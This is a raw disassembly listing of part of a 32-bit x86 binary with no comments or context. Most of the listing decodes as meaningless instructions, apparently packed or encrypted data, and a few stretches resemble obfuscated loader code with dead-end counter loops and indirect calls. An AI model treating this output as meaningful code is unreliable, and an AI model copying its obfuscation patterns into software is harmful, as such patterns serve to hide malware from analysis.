  408c60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c61:	pop    ecx
  408c62:	fist   DWORD PTR [eax+0x506a9aff]
  408c68:	ficom  DWORD PTR [edi-0x3187de40]
  408c6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c6f:	repz mov ch,0xa9
  408c72:	push   ds
  408c73:	push   ebx
  408c74:	xchg   edx,eax
  408c75:	je     0x408c05
  408c77:	mov    edi,0xfd0e53ca
  408c7c:	clc    
  408c7d:	addr16 sbb al,0xbe
  408c80:	push   0xa3df3d90
  408c85:	shl    bh,cl
  408c87:	dec    esi
  408c88:	xchg   edx,eax
  408c89:	xchg   ecx,eax
  408c8a:	cwde   
  408c8b:	dec    edi
  408c8c:	in     eax,0x9b
  408c8e:	and    eax,0xfd60335
  408c93:	scas   eax,DWORD PTR es:[edi]
  408c94:	xlat   BYTE PTR ds:[ebx]
  408c95:	sub    DWORD PTR [eax],edx
  408c97:	mov    eax,DWORD PTR [ebp-0x14]
  408c9a:	jmp    0x408756
  408c9f:	mov    eax,DWORD PTR [ebp-0xc]
  408ca2:	mov    edx,DWORD PTR [ebp-0x18]
  408ca5:	jmp    0x408e2c
  408caa:	test   ecx,ebx
  408cac:	stc    
  408cad:	test   BYTE PTR [ecx+0x64],ah
  408cb0:	sbb    ecx,0x67327607
  408cb6:	or     cl,bl
  408cb8:	mov    ebp,0x7edc14b1
  408cbd:	jle    0x408ca3
  408cbf:	jg     0x408d3f
  408cc1:	jle    0x408cf5
  408cc3:	push   cs
  408cc4:	jo     0x408cec
  408cc6:	sub    al,0xeb
  408cc8:	mov    esp,0x6f9aa96e
  408ccd:	pop    ebx
  408cce:	jbe    0x408cd3
  408cd0:	mov    ebp,0x77ef6e7d
  408cd5:	sub    cl,BYTE PTR [eax+0xb]
  408cd8:	loop   0x408cb5
  408cda:	add    ebp,edx
  408cdc:	xor    eax,0x599e1695
  408ce1:	pushf  
  408ce2:	stos   DWORD PTR es:[edi],eax
  408ce3:	nop
  408ce4:	mov    ebx,ebp
  408ce6:	out    dx,eax
  408ce7:	rol    DWORD PTR [ecx-0x3e],cl
  408cea:	lock arpl WORD PTR [ebx+ebx*1],sp
  408cee:	sahf   
  408cef:	push   0x26
  408cf1:	lock fcom st(4)
  408cf4:	fs adc eax,0xe9e8085e
  408cfa:	daa    
  408cfb:	mov    cl,BYTE PTR [esi-0x1ee5bb04]
  408d01:	lahf   
  408d02:	rcl    DWORD PTR [eax+0x58],cl
  408d05:	mov    ah,0x10
  408d07:	sub    al,0x90
  408d09:	jge    0x408d38
  408d0b:	pop    esi
  408d0c:	inc    eax
  408d0d:	xchg   esp,eax
  408d0e:	popa   
  408d0f:	stos   BYTE PTR es:[edi],al
  408d10:	idiv   DWORD PTR [ebp*8+0xe6cb93c]
  408d17:	jns    0x408cd2
  408d19:	jle    0x408d59
  408d1b:	mov    esp,0x1c9793cb
  408d20:	les    esp,FWORD PTR ds:0xe47872e1
  408d26:	mov    esi,DWORD PTR [edi-0x4a501bd3]
  408d2c:	int3   
  408d2d:	dec    esi
  408d2e:	iret   
  408d2f:	sub    DWORD PTR [esp+edi*8+0x73],ebp
  408d33:	jl     0x408d96
  408d35:	outs   dx,BYTE PTR ds:[esi]
  408d36:	inc    esp
  408d37:	mov    ds:0x31610c2a,al
  408d3c:	mov    ch,0x24
  408d3e:	mov    ebx,ebx
  408d40:	ror    BYTE PTR [edx-0x6d],cl
  408d43:	xchg   edi,eax
  408d44:	fwait
  408d45:	repnz and DWORD PTR [eax+0x43],0x6c36d22b
  408d4d:	cs bnd jbe 0x408d5f
  408d51:	inc    edx
  408d52:	inc    ebx
  408d53:	mov    WORD PTR [edi+0x20710724],fs
  408d59:	loope  0x408db2
  408d5b:	(bad)  
  408d5c:	int    0x46
  408d5e:	jb     0x408ce8
  408d60:	aaa    
  408d61:	lahf   
  408d62:	scas   eax,DWORD PTR es:[edi]
  408d63:	mov    dh,bh
  408d65:	cmp    al,BYTE PTR [edx-0xa589e35]
  408d6b:	cs dec eax
  408d6d:	pushf  
  408d6e:	push   es
  408d6f:	mov    bl,0xc2
  408d71:	mov    bh,0x2a
  408d73:	jne    0x408cf6
  408d75:	add    al,0x38
  408d77:	out    dx,al
  408d78:	(bad)  
  408d79:	clc    
  408d7a:	jns    0x408dd8
  408d7c:	shl    BYTE PTR ds:0x89cef6f,cl
  408d82:	std    
  408d83:	daa    
  408d84:	ret    
  408d85:	jae    0x408e06
  408d87:	xchg   edx,eax
  408d88:	cmp    edx,DWORD PTR [eax+0x4971424a]
  408d8e:	hlt    
  408d8f:	daa    
  408d90:	mov    bh,0x10
  408d92:	(bad)  [eax+eax*1+0x7]
  408d96:	iret   
  408d97:	xlat   BYTE PTR ds:[ebx]
  408d98:	sub    al,0xc5
  408d9a:	adc    dl,BYTE PTR [edx-0x3c]
  408d9d:	outs   dx,BYTE PTR ds:[esi]
  408d9e:	paddd  mm2,QWORD PTR [ebp+0x15733876]
  408da5:	clc    
  408da6:	shr    BYTE PTR [eax],1
  408da8:	addr16 dec ebx
  408daa:	dec    ecx
  408dab:	cmp    bl,BYTE PTR [esp+edi*1]
  408dae:	addr16 cmp al,0x15
  408db1:	(bad)  
  408db2:	clc    
  408db3:	lock push ds
  408db5:	lds    esi,FWORD PTR [edx-0x65]
  408db8:	mov    bh,bh
  408dba:	mov    BYTE PTR [ecx],0xf2
  408dbd:	xchg   ebp,eax
  408dbe:	add    eax,DWORD PTR [edx]
  408dc0:	adc    eax,0xd038d016
  408dc5:	loop   0x408e40
  408dc7:	push   es
  408dc8:	dec    edx
  408dc9:	jno    0x408e26
  408dcb:	inc    esi
  408dcc:	xor    cl,BYTE PTR [edi+0x7d0156ad]
  408dd2:	mov    fs,WORD PTR [edx+ecx*4-0x7f]
  408dd6:	xor    bl,0x89
  408dd9:	lods   al,BYTE PTR ds:[esi]
  408dda:	push   esi
  408ddb:	dec    eax
  408ddc:	cld    
  408ddd:	lods   eax,DWORD PTR ds:[esi]
  408dde:	and    ebx,DWORD PTR [edi+0x72]
  408de1:	sub    eax,0xcdbc904c
  408de6:	test   eax,0xb1beb5f6
  408deb:	aaa    
  408dec:	shl    ebx,0x37
  408def:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408df0:	xchg   si,ax
  408df2:	mov    db5,ebx
  408df5:	leave  
  408df6:	mov    ecx,ecx
  408df8:	mov    ebx,0x4a5e3257
  408dfd:	imul   ebx,DWORD PTR ds:0x4572f502,0x5f450b58
  408e07:	lock sub cl,BYTE PTR [edi+0x43225626]
  408e0e:	fmulp  st(4),st
  408e10:	fnstcw WORD PTR [edx+0x67]
  408e13:	(bad)  
  408e14:	mov    al,ds:0x321ac410
  408e19:	adc    ecx,ebp
  408e1b:	dec    eax
  408e1c:	jo     0x408e3b
  408e1e:	sahf   
  408e1f:	sti    
  408e20:	ss retf 0x9ed9
  408e24:	outs   dx,BYTE PTR ds:[esi]
  408e25:	xor    BYTE PTR [esi+0x8],bl
  408e28:	inc    ecx
  408e29:	adc    BYTE PTR [ecx],bl
  408e2b:	cmp    dh,BYTE PTR [ebx]
  408e2d:	ret    0x5b3d
  408e30:	or     al,0xa8
  408e32:	jp     0x408e43
  408e34:	test   BYTE PTR [ecx-0x9],dl
  408e37:	(bad)  
  408e38:	dec    DWORD PTR [ebx+0x81f045]
  408e3e:	add    DWORD PTR ds:0x43e90740,esi
  408e44:	idiv   edi
  408e46:	dec    DWORD PTR [ebx-0x7d161bbb]
  408e4c:	add    DWORD PTR [eax],eax
  408e4e:	add    BYTE PTR ds:0xa417048d,dh
  408e54:	xchg   edi,eax
  408e55:	xor    eax,0xaa1dcad
  408e5a:	jmp    0xd29942f7
  408e5f:	cli    
  408e60:	fnstsw WORD PTR [esi+0x7e]
  408e63:	in     al,0x7f
  408e65:	jle    0x408ee5
  408e67:	icebp  
  408e68:	and    BYTE PTR [edi],dl
  408e6a:	mov    ds:0x8a85dcf1,al
  408e6f:	inc    ebp
  408e70:	cdq    
  408e71:	jmp    0x9f:0x2638e304
  408e78:	add    ebp,DWORD PTR [edx+0x34]
  408e7b:	cmp    DWORD PTR [ebp+edx*8-0x14],eax
  408e7f:	data16 and al,0x8b
  408e82:	shl    DWORD PTR [edx-0x17ebe835],1
  408e88:	sti    
  408e89:	ret    
  408e8a:	cmp    eax,0xb2c3afea
  408e8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e90:	out    0x43,al
  408e92:	je     0x408e2a
  408e94:	adc    DWORD PTR [ecx],esp
  408e96:	mov    ecx,0xbed4b2ed
  408e9b:	mov    eax,ds:0x9831df11
  408ea0:	dec    ebp
  408ea1:	push   ds
  408ea2:	push   ecx
  408ea3:	add    ah,BYTE PTR [ebp+0x7a5eb3d9]
  408ea9:	aad    0xf4
  408eab:	adc    ah,cl
  408ead:	xchg   edx,eax
  408eae:	mov    BYTE PTR [ebp-0x35978839],cl
  408eb4:	jne    0x408e8c
  408eb6:	adc    ch,BYTE PTR [edx]
  408eb8:	arpl   WORD PTR [edi+0x4c364dc9],sp
  408ebe:	movsx  esi,dl
  408ec1:	lock out 0xd2,al
  408ec4:	mov    BYTE PTR [esi+0x22882dc6],dl
  408eca:	xor    bh,BYTE PTR fs:[edi+0x657f2738]
  408ed1:	cmp    ch,BYTE PTR [eax-0x53bb0c2f]
  408ed7:	nop
  408ed8:	les    esi,FWORD PTR [edx+0x33]
  408edb:	ror    BYTE PTR [esi-0x74],1
  408ede:	or     DWORD PTR [eax],ecx
  408ee0:	sub    al,0x2b
  408ee2:	mov    dh,0x30
  408ee4:	pop    ebx
  408ee5:	push   ebx
  408ee6:	and    DWORD PTR [eax-0x3f],0xa7eb403
  408eed:	jmp    0x408ed7
  408eef:	clc    
  408ef0:	xor    esi,DWORD PTR [edi+0x2e2822fd]
  408ef6:	cmp    BYTE PTR [ebx+0x247b57e3],bl
  408efc:	xor    DWORD PTR [eax],ecx
  408efe:	fptan  
  408f00:	sbb    edi,DWORD PTR [eax-0x17]
  408f03:	out    0xe0,al
  408f05:	cmp    al,dh
  408f07:	sub    DWORD PTR [edi+0x66],0x7f8525a2
  408f0e:	aam    0xa6
  408f10:	pop    ebx
  408f11:	pop    ds
  408f12:	stc    
  408f13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f14:	and    edi,0x1d48586a
  408f1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f1b:	sbb    edi,DWORD PTR [ebp+0x5276b7d9]
  408f21:	inc    eax
  408f22:	pop    esp
  408f23:	mov    eax,0x56bd5166
  408f28:	or     BYTE PTR [edx+0x33716ec6],0xd2
  408f2f:	cmp    eax,0x290ee1a0
  408f34:	fild   WORD PTR [eax]
  408f36:	jb     0x408f57
  408f38:	aaa    
  408f39:	xchg   esi,eax
  408f3a:	or     cl,BYTE PTR [ecx+0xe]
  408f3d:	or     eax,DWORD PTR gs:[edi-0x31303da6]
  408f44:	hlt    
  408f45:	push   edi
  408f46:	es out dx,eax
  408f48:	dec    ebp
  408f49:	xor    ch,bh
  408f4b:	daa    
  408f4c:	rcr    BYTE PTR [eax+0x30a5ed4f],0x32
  408f53:	push   0xfffffff9
  408f55:	retf   
  408f56:	sub    DWORD PTR [esp+ebx*2-0x39],edx
  408f5a:	sbb    cl,BYTE PTR [eax+0x22ac04d2]
  408f60:	sbb    BYTE PTR [eax],dh
  408f62:	stos   DWORD PTR es:[edi],eax
  408f63:	rol    DWORD PTR [ebx+0x42],1
  408f66:	mov    ebp,0xf42be923
  408f6b:	mov    al,ds:0xb17bc580
  408f70:	jecxz  0x408fd8
  408f72:	push   eax
  408f73:	jmp    0x4f96bb25
  408f78:	cwde   
  408f79:	aas    
  408f7a:	push   es
  408f7b:	mov    cl,0x54
  408f7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f7e:	mov    esp,0x94b8624b
  408f83:	test   al,0x73
  408f85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f86:	arpl   WORD PTR [ecx-0x39],dx
  408f89:	add    eax,0x2d8e0907
  408f8e:	cmp    ebp,ebx
  408f90:	test   DWORD PTR [eax-0x3f],0xbf9539e4
  408f97:	retf   0x5d1f
  408f9a:	and    eax,0x1ef47d95
  408f9f:	push   ss
  408fa0:	fnstenv [esi-0x65e70692]
  408fa6:	mov    ecx,0xf423ccf6
  408fab:	pushf  
  408fac:	xchg   ecx,eax
  408fad:	or     cl,BYTE PTR [edi]
  408faf:	jecxz  0x408f4e
  408fb1:	pop    ds
  408fb2:	mov    ebx,0x3d811fc9
  408fb7:	popf   
  408fb8:	bound  ebx,QWORD PTR [esp+esi*2]
  408fbb:	daa    
  408fbc:	adc    DWORD PTR [esi-0x1a57a51],esi
  408fc2:	cmp    dl,al
  408fc4:	stc    
  408fc5:	retf   
  408fc6:	dec    ebx
  408fc7:	mov    cs:0xcf1ac68d,al
  408fcd:	in     eax,dx
  408fce:	sbb    al,0x58
  408fd0:	add    eax,0x840f3839
  408fd5:	mov    cl,0xf5
  408fd7:	(bad)  
  408fd8:	(bad)  
  408fd9:	mov    eax,0x800f1c9a
  408fde:	jmp    0x4088e1
  408fe3:	push   ebp
  408fe4:	mov    ebp,esp
  408fe6:	sub    esp,0x20
  408fe9:	sub    ecx,eax
  408feb:	mov    eax,ds:0x413bde
  408ff0:	and    DWORD PTR ds:0x4337af,0x0
  408ffa:	jmp    0x40900c
  408fff:	mov    ecx,DWORD PTR ds:0x4337af
  409005:	inc    ecx
  409006:	mov    DWORD PTR ds:0x4337af,ecx
  40900c:	cmp    DWORD PTR ds:0x4337af,0x1c
  409013:	jae    0x409040
  409019:	cmp    DWORD PTR ds:0x4337af,0x20
  409020:	jne    0x40903b
  409026:	push   0x4819
  40902b:	push   0x30ae
  409030:	push   0x3675
  409035:	call   DWORD PTR ds:0x412014
  40903b:	jmp    0x408fff
  409040:	mov    eax,DWORD PTR [eax+0x198]
  409046:	mov    DWORD PTR [ebp-0x8],eax
  409049:	and    DWORD PTR ds:0x4337eb,0x0
  409053:	mov    ecx,DWORD PTR ds:0x4337eb
  409059:	inc    ecx
  40905a:	mov    DWORD PTR ds:0x4337eb,ecx
  409060:	cmp    DWORD PTR ds:0x4337eb,0x1c
  409067:	jne    0x409085
  40906d:	push   0x43382f
  409072:	push   0x494f
  409077:	push   0x43389a
  40907c:	push   DWORD PTR [ebp-0x24]
  40907f:	call   DWORD PTR ds:0x412394
  409085:	cmp    DWORD PTR ds:0x4337eb,0x13
  40908c:	jb     0x409053
  409092:	mov    eax,DWORD PTR [ebp+0x8]
  409095:	and    ecx,DWORD PTR ds:0x4337f3
  40909b:	mov    ecx,DWORD PTR [ebp-0x8]
  40909e:	sbb    DWORD PTR ds:0x433803,0x43383b
  4090a8:	push   ebx
  4090a9:	xor    DWORD PTR ds:0x433777,0x7c2a
  4090b3:	push   esi
  4090b4:	mov    esi,DWORD PTR ds:0x4337c7
  4090ba:	mov    ebx,DWORD PTR ds:0x4337db
  4090c0:	sub    ebx,esi
  4090c2:	or     esi,DWORD PTR [esi+ebx*1]
  4090c5:	mov    esi,0x7510854
  4090ca:	xor    eax,esi
  4090cc:	adc    DWORD PTR ds:0x4337a7,0x43372f
  4090d6:	push   edi
  4090d7:	mov    edi,0x32729b
  4090dc:	and    ebx,DWORD PTR ds:0x433727
  4090e2:	add    eax,edi
  4090e4:	mov    DWORD PTR [ecx],eax
  4090e6:	or     DWORD PTR ds:0x43383b,ebx
  4090ec:	lea    eax,[ebp-0x4]
  4090ef:	mov    DWORD PTR [ebp-0x10],eax
  4090f2:	mov    eax,DWORD PTR [ebp+0x8]
  4090f5:	mov    ecx,DWORD PTR [ebp-0x10]
  4090f8:	xor    eax,esi
  4090fa:	sbb    ebx,0x3e7b
  409100:	add    eax,edi
  409102:	mov    DWORD PTR ds:0x433713,0x17
  40910c:	cmp    DWORD PTR ds:0x433713,0x0
  409113:	je     0x40914b
  409119:	cmp    DWORD PTR ds:0x433713,0x27
  409120:	jne    0x409139
  409126:	push   0x3901
  40912b:	push   0x70c3
  409130:	push   DWORD PTR [ebp-0x1c]
  409133:	call   DWORD PTR ds:0x412398
  409139:	mov    ebx,DWORD PTR ds:0x433713
  40913f:	dec    ebx
  409140:	mov    DWORD PTR ds:0x433713,ebx
  409146:	jmp    0x40910c
  40914b:	mov    DWORD PTR [ecx],eax
  40914d:	neg    DWORD PTR ds:0x4337a7
  409153:	jmp    0x409474
  409158:	add    eax,0x73dd76a0
  40915d:	jmp    0x619bf1f7
  409162:	mov    ch,0x2
  409164:	mov    ds:0x60641cdc,al
  409169:	fidivr DWORD PTR [esi+0x7e]
  40916c:	jp     0x4091eb
  40916e:	jle    0x4091ee
  409170:	(bad)  
  409171:	test   ebx,ebp
  409173:	push   ss
  409174:	push   0x66
  409176:	push   ecx
  409177:	pop    esi
  409178:	dec    ebp
  409179:	and    eax,0x864156ab
  40917e:	mov    esp,0x8f00c8a
  409183:	call   0xbad57e18
  409188:	push   ebx
  409189:	pop    esp
  40918a:	out    0x40,eax
  40918c:	sbb    eax,0x17fb802b
  409191:	xchg   ecx,eax
  409192:	or     ch,BYTE PTR [eax+0x3f17e7d2]
  409198:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409199:	fisttp WORD PTR [edx+0x7ace4a63]
  40919f:	lea    edx,[ebx-0x18]
  4091a2:	imul   ebp,ebp,0xffffffa5
  4091a5:	xchg   ebx,eax
  4091a6:	int3   
  4091a7:	xor    al,0x4
  4091a9:	iret   
  4091aa:	(bad)  
  4091ac:	jmp    0x3afb:0x60215f8f
  4091b3:	jb     0x40916b
  4091b5:	cli    
  4091b6:	xchg   ebp,eax
  4091b7:	loop   0x4091d8
  4091b9:	popf   
  4091ba:	fld    st(5)
  4091bc:	push   eax
  4091bd:	lea    ecx,[edi-0x62]
  4091c0:	inc    esp
  4091c1:	repz sub DWORD PTR [esi+edx*4+0x769bc24e],ebx
  4091c9:	and    BYTE PTR [eax],al
  4091cb:	popf   
  4091cc:	sub    al,BYTE PTR [ebx]
  4091ce:	xbegin 0x7cb4e7fc
  4091d4:	out    0x2e,al
  4091d6:	stos   BYTE PTR es:[edi],al
  4091d7:	pop    ds
  4091d8:	adc    ebx,DWORD PTR [edx]
  4091da:	mov    cl,0xa4
  4091dc:	in     eax,dx
  4091dd:	sar    bh,cl
  4091df:	std    
  4091e0:	or     BYTE PTR [ebp+edx*2-0x79],0xe4
  4091e5:	cs sti 
  4091e7:	outs   dx,BYTE PTR ds:[esi]
  4091e8:	fmul   QWORD PTR [ecx-0x5a8be479]
  4091ee:	mov    BYTE PTR [ecx+0x2],ah
  4091f1:	fsubrp st(1),st
  4091f3:	scas   eax,DWORD PTR es:[edi]
  4091f4:	sahf   
  4091f5:	xor    esi,DWORD PTR [esi-0x62]
  4091f8:	pusha  
  4091f9:	and    eax,0x6aa4e175
  4091fe:	cmp    eax,0xfa5f849c
  409203:	inc    esi
  409204:	ficom  DWORD PTR [ebx-0x107c1f5a]
  40920a:	sub    DWORD PTR [ecx],edx
  40920c:	inc    esp
  40920d:	mov    WORD PTR [ecx+0x37],cs
  409210:	xchg   edx,eax
  409211:	clc    
  409212:	lods   al,BYTE PTR ds:[esi]
  409213:	inc    ebp
  409214:	std    
  409215:	xor    al,0x2c
  409217:	pop    es
  409218:	aad    0x2a
  40921a:	dec    eax
  40921b:	inc    esp
  40921c:	or     dl,dh
  40921e:	cdq    
  40921f:	fdiv   st(1),st
  409221:	mov    al,ds:0xc7a8d3dd
  409226:	push   es
  409227:	add    edx,DWORD PTR [ebp-0x51]
  40922a:	or     DWORD PTR [ebx],ebx
  40922c:	addr16 mov ds:0x14ae,eax
  409230:	rcl    dl,cl
  409232:	add    esp,ebx
  409234:	or     BYTE PTR [edx+0x73f6999e],bl
  40923a:	mov    ds:0x32ab82ad,al
  40923f:	enter  0x239b,0xc2
  409243:	paddq  mm6,mm6
  409246:	not    DWORD PTR [eax+0x58]
  409249:	cwde   
  40924a:	fadd   DWORD PTR [esp+ecx*2]
  40924d:	push   0xffffff87
  40924f:	xchg   esp,eax
  409250:	sti    
  409251:	dec    edi
  409252:	loopne 0x4092b3
  409254:	cs push ds
  409256:	push   ds
  409257:	add    dl,bh
  409259:	(bad)  
  40925a:	ins    DWORD PTR es:[edi],dx
  40925b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40925c:	mov    dl,BYTE PTR [ecx]
  40925e:	sahf   
  40925f:	xor    eax,0xfea173a6
  409264:	sbb    ecx,DWORD PTR [ecx-0x5266145a]
  40926a:	mov    ds:0xb4f6dd45,eax
  40926f:	mov    ds,WORD PTR [esi]
  409271:	sti    
  409272:	mov    ch,0x2a
  409274:	push   0xf6474f07
  409279:	add    DWORD PTR [eax+0x6aa2594],edi
  40927f:	mov    ecx,ebp
  409281:	call   0x22b5:0x22bc2dae
  409288:	jb     0x409306
  40928a:	cmp    esi,ecx
  40928c:	push   edi
  40928d:	(bad)
  409291:	dec    ecx
  409292:	rcl    BYTE PTR [esi-0x65a8cbf2],1
  409298:	push   0xf6b70bc
  40929d:	popf   
  40929e:	push   es
  40929f:	pop    ecx
  4092a0:	aas    
  4092a1:	push   0x77ea280b
  4092a6:	cmc    
  4092a7:	ror    DWORD PTR [esi+0x65a39266],cl
  4092ad:	lds    ebp,FWORD PTR [edx-0x5d326c41]
  4092b3:	mov    dl,0x2b
  4092b5:	imul   edx,DWORD PTR [edi+ebp*2+0x4a],0x75fcd0e1
  4092bd:	push   edx
  4092be:	xlat   BYTE PTR ds:[ebx]
  4092bf:	gs in  eax,dx
  4092c1:	loope  0x40929c
  4092c3:	stos   BYTE PTR es:[edi],al
  4092c4:	inc    edi
  4092c5:	mov    ebp,0xc23ca6f9
  4092ca:	sub    BYTE PTR [edi],0x30
  4092cd:	inc    edx
  4092ce:	mov    bl,0xe9
  4092d0:	cmp    ebx,DWORD PTR [edx]
  4092d2:	ins    BYTE PTR es:[edi],dx
  4092d3:	mov    bh,0x17
  4092d5:	mov    ds:0x6c6a28e1,al
  4092da:	cmp    ecx,DWORD PTR [eax]
  4092dc:	cli    
  4092dd:	outs   dx,BYTE PTR ds:[esi]
  4092de:	xchg   edx,eax
  4092df:	out    0xf4,eax
  4092e1:	in     eax,0x2b
  4092e3:	sbb    DWORD PTR [ebp-0x6a],edi
  4092e6:	test   DWORD PTR ds:0x124f713c,edx
  4092ec:	push   esp
  4092ed:	ror    DWORD PTR [edi-0x1b],0x3d
  4092f1:	faddp  st(5),st
  4092f3:	pop    ecx
  4092f4:	fisubr DWORD PTR ds:0xd050c07b
  4092fa:	js     0x4092a3
  4092fc:	pop    esi
  4092fd:	in     al,0xfa
  4092ff:	pop    eax
  409300:	cmc    
  409301:	adc    ah,0xf8
  409304:	pop    esi
  409305:	mov    al,ds:0xb0f1af7a
  40930a:	loopne 0x409363
  40930c:	pop    ebx
  40930d:	push   ds
  40930e:	inc    ecx
  40930f:	xchg   DWORD PTR [esi],ebp
  409311:	mov    ecx,0x1b2e05d9
  409316:	push   0x128a33f5
  40931b:	cwde   
  40931c:	inc    BYTE PTR [esp+eax*1]
  40931f:	nop
  409320:	push   edi
  409321:	sti    
  409322:	enter  0x3626,0x3
  409326:	mov    esi,cs
  409328:	push   ds
  409329:	mov    bh,0x4f
  40932b:	push   ds
  40932c:	out    dx,al
  40932d:	and    esp,DWORD PTR [ecx+0x7a]
  409330:	mov    dl,0x27
  409332:	adc    al,BYTE PTR [ecx+eiz*1-0x6d]
  409336:	ret    0x4acc
  409339:	adc    eax,0x338f3d27
  40933e:	mov    edx,0x96cb5a07
  409343:	pop    ebx
  409344:	push   eax
  409345:	or     DWORD PTR [esp+ecx*2-0x22],ecx
  409349:	jbe    0x409348
  40934b:	mov    DWORD PTR [eax+0x66f247e5],eax
  409351:	push   edi
  409352:	jne    0x4093a0
  409354:	leave  
  409355:	jecxz  0x409395
  409357:	dec    ebx
  409358:	fdivr  QWORD PTR [ebx-0x4a131f26]
  40935e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40935f:	sub    DWORD PTR [esi-0x5],ebp
  409362:	leave  
  409363:	mov    WORD PTR [ecx+edi*2+0x52f1ed2b],gs
  40936a:	mov    eax,eax
  40936c:	pop    ss
  40936d:	push   DWORD PTR [edi+0x45e9d5af]
  409373:	push   es
  409374:	stc    
  409375:	mov    esi,DWORD PTR [edx+edx*1-0x51]
  409379:	arpl   WORD PTR [ecx],cx
  40937b:	adc    eax,0xc9322840
  409380:	inc    ebx
  409381:	lahf   
  409382:	push   ebp
  409383:	test   DWORD PTR [edx-0x7c],edi
  409386:	pop    ds
  409387:	inc    esp
  409388:	fst    st(0)
  40938a:	stos   BYTE PTR es:[edi],al
  40938b:	add    eax,0x8c21112a
  409390:	test   al,0xfe
  409392:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409393:	dec    ebx
  409394:	sahf   
  409395:	jns    0x40934e
  409397:	ins    DWORD PTR es:[edi],dx
  409398:	enter  0xe0ae,0x19
  40939c:	pop    es
  40939d:	fwait
  40939e:	cli    
  40939f:	mov    ecx,0xa1ee023b
  4093a4:	stos   DWORD PTR es:[edi],eax
  4093a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093a6:	setno  cl
  4093a9:	sub    al,0xc0
  4093ab:	pop    ebp
  4093ac:	(bad)  
  4093ad:	dec    edi
  4093ae:	out    dx,eax
  4093af:	repnz popa 
  4093b1:	and    esi,DWORD PTR [eax+0x7aa3db48]
  4093b7:	popa   
  4093b8:	inc    ebx
  4093b9:	xchg   ecx,eax
  4093ba:	and    cl,BYTE PTR ss:[eax]
  4093bd:	ja     0x40941b
  4093bf:	test   al,cl
  4093c1:	mov    al,ds:0xcdfb0c9d
  4093c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093c7:	in     al,0xce
  4093c9:	pop    ecx
  4093ca:	aad    0xf2
  4093cc:	(bad)  
  4093cd:	dec    edi
  4093ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093cf:	fidiv  WORD PTR [eax+0x26]
  4093d2:	out    0x8,al
  4093d4:	cmp    edx,DWORD PTR [eax+0x39]
  4093d7:	inc    esp
  4093d8:	(bad)  ds:0x713ea52f
  4093de:	rcl    eax,cl
  4093e0:	repnz aam 0xa0
  4093e3:	push   ebx
  4093e4:	icebp  
  4093e5:	es dec edi
  4093e7:	add    edi,DWORD PTR [esi+0x18]
  4093ea:	cmp    al,0x17
  4093ec:	mov    ds,WORD PTR [edx]
  4093ee:	psubq  mm5,QWORD PTR [edx+0x2a7e9061]
  4093f5:	les    eax,FWORD PTR [ecx+0x5677bb4]
  4093fb:	xchg   edx,eax
  4093fc:	mov    cl,0x8e
  4093fe:	(bad)  
  4093ff:	add    DWORD PTR [edx+0x24],0xf7081b10
  409406:	sub    edx,ebx
  409408:	repnz or bh,ch
  40940b:	les    edx,FWORD PTR [edi+0x77]
  40940e:	repz test DWORD PTR [esi+eax*1],ebx
  409412:	xor    ecx,edi
  409414:	push   cs
  409415:	cmp    eax,0xa3024e2a
  40941a:	mov    esp,0x14636f1d
  40941f:	cmc    
  409420:	call   esi
  409422:	(bad)  
  409423:	popf   
  409424:	cmp    edx,DWORD PTR [esi-0x56fc70f]
  40942a:	jmp    0xd4e5:0xd32aca3f
  409431:	ds nop
  409433:	(bad)  
  409434:	jle    0x409416
  409436:	dec    edi
  409437:	pop    ecx
  409438:	(bad)  
  409439:	scas   al,BYTE PTR es:[edi]
  40943a:	add    bl,BYTE PTR [eax]
  40943c:	int3   
  40943d:	sbb    DWORD PTR [edi],eax
  40943f:	xchg   esp,eax
  409440:	push   ebp
  409441:	xor    al,0x4d
  409443:	ja     0x40948d
  409445:	push   es
  409446:	enter  0x4e12,0x31
  40944a:	dec    ebp
  40944b:	in     eax,dx
  40944c:	fstp   DWORD PTR [eax]
  40944e:	enter  0x83f3,0x3c
  409452:	loope  0x4093fc
  409454:	ret    
  409455:	sub    eax,0xccb4ec0c
  40945a:	adc    edi,DWORD PTR [ebx-0x75d3793f]
  409460:	fisubr WORD PTR [ecx]
  409462:	sar    dl,cl
  409464:	mov    dh,BYTE PTR [edx-0x61]
  409467:	mov    ebp,0xb4481c06
  40946c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40946d:	popf   
  40946e:	xor    BYTE PTR [edi-0x4e],ah
  409471:	rcr    edx,1
  409473:	dec    ebx
  409474:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  40947b:	and    DWORD PTR ds:0x43382b,0x0
  409485:	xor    ecx,ecx
  409487:	add    ecx,DWORD PTR ds:0x43382b
  40948d:	inc    ecx
  40948e:	mov    DWORD PTR ds:0x43382b,ecx
  409494:	cmp    DWORD PTR ds:0x43382b,0x23
  40949b:	jne    0x4094bf
  4094a1:	push   0x7f04
  4094a6:	push   DWORD PTR [ebp-0xc]
  4094a9:	push   DWORD PTR [ebp-0x28]
  4094ac:	push   0x10bc
  4094b1:	push   DWORD PTR [ebp-0x10]
  4094b4:	push   0x1509
  4094b9:	call   DWORD PTR ds:0x41239c
  4094bf:	cmp    DWORD PTR ds:0x43382b,0x13
  4094c6:	jb     0x409485
  4094cc:	sub    DWORD PTR ds:0x433713,ecx
  4094d2:	lea    eax,[ebp-0x14]
  4094d5:	and    DWORD PTR ds:0x433777,0x0
  4094df:	jmp    0x4094f1
  4094e4:	mov    ebx,DWORD PTR ds:0x433777
  4094ea:	inc    ebx
  4094eb:	mov    DWORD PTR ds:0x433777,ebx
  4094f1:	cmp    DWORD PTR ds:0x433777,0x13
  4094f8:	jae    0x40951b
